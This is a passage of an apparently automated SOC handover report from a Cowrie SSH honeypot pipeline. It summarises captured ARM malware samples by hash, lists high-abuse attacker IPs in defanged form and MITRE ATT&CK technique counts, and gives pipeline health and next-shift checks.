| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `175.212.12[.]133` | KR | Chungbukbonbujang | **100** ⚠️ | 6 |
| `79.45.101[.]239` | IT | Telecom Italia S.p.A. | **100** ⚠️ | 9 |
| `64.225.101[.]76` | DE | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `23.88.103[.]45` | DE | Hetzner Online GmbH | **100** ⚠️ | 4 |
| `14.103.127[.]66` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `220.77.235[.]89` | KR | Korea Telecom | **100** ⚠️ | 21 |
| `221.229.220[.]180` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `103.186.1[.]59` | ID | CV Ansa Project | **100** ⚠️ | 50 |
| `222.71.205[.]34` | CN | CHINANET shanghai province network | **100** ⚠️ | 34 |
| `197.153.57[.]103` | MA | MEDITELECOM | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 158 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 66 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 59 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 35 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 35 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 164 cases |
| Tool 34  | Credential Extractor        | ✅ 125 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 66 priority case(s) shown individually · 14 recon entry/entries in table (6 group(s) consolidating 88 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-12T07:11:37Z_
